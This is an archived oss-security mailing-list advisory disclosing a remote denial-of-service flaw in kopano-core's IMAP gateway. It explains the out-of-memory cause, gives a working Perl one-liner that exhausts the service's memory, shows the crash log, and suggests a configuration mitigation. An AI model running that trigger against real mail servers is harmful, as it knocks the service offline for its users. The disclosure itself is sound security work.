X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1804" "Saturday" "1" "May" "2021" "17:07:37" "+0200" "Jan Engelhardt" "jengelh@inai.de" nil "41" "[oss-security] kopano-core 11.0.1.143: Remote DoS with resource exhaustion" nil nil nil "5" nil nil (number mark "U       jengelh@inai May  1   41/1804  " thread-indent "\"[oss-security] kopano-core 11.0.1.143: Remote DoS with resource exhaustion\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] kopano-core 11.0.1.143: Remote DoS with resource exhaustion" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 18271 invoked by uid 550); 1 May 2021 15:10:45 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 17536 invoked from network); 1 May 2021 15:07:49 -0000
Date: Sat, 1 May 2021 17:07:37 +0200 (CEST)
From: Jan Engelhardt <jengelh@inai.de>
To: oss-security@lists.openwall.com
Message-ID: <p883nn87-4nrq-8060-88p-70o27nr6n0r2@vanv.qr>
User-Agent: Alpine 2.24 (LSU 510 2020-10-10)
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8BIT
Subject: [oss-security] kopano-core 11.0.1.143: Remote DoS with resource exhaustion


To the best of my knowledge, this is the initial publication,
and there is no CVE number as of this time.


# Affected versions

  * kopano-core 8.5 to 11.0.1.143

The "kopano-gateway" program implements a network service for IMAP.
By default, a generous buffer is allocated for string literals, so
the service can be triggered to go into an out-of-memory condition.
OOM appears to be handled (log msg with "Cannot allocate memory"),
but not _consistently_, letting std::bad_alloc escape somewhere,
terminating the process and denying further access to the service.


# Trigger

» ./kopano-gateway -F &
» perl -MIO::Socket::INET -e 
  '$a="A"x65536;for(1..99){$s=IO::Socket::INET->new(PeerHost,"localhost",PeerPort,143);
  $s->write("K {134217727}\r\n");$s->write($a) for 1..2048;push@k,$s;}'

2021-05-01T17:00:03.424598: [error  ] Failed to read line: Cannot allocate memory
2021-05-01T17:00:40.489165: [crit   ] ----------------------------------------------------------------------
2021-05-01T17:00:40.489174: [crit   ] Fatal error detected. Please report all following information.
2021-05-01T17:00:40.489186: [crit   ] kopano-dagent 11.0.1
2021-05-01T17:00:40.489210: [crit   ] OS: openSUSE Tumbleweed (Linux 5.12.0-3.g6208a83-default x86_64)
2021-05-01T17:00:40.489217: [crit   ] Thread name: kopano-gateway
2021-05-01T17:00:40.489429: [crit   ] Peak RSS: 3056660
2021-05-01T17:00:40.489444: [crit   ] Pid 31604 caught SIGABRT (6), out of memory or unhandled exception, traceback:
terminate called after throwing an instance of 'std::bad_alloc'
  what():  std::bad_alloc


# Mitigation

A reduction of the buffer (gateway.cfg:imap_max_messagesize) is 
possible, but this administrative action equally implies a reduction of 
the service capabilities offered to end-users (and may be unpopular).
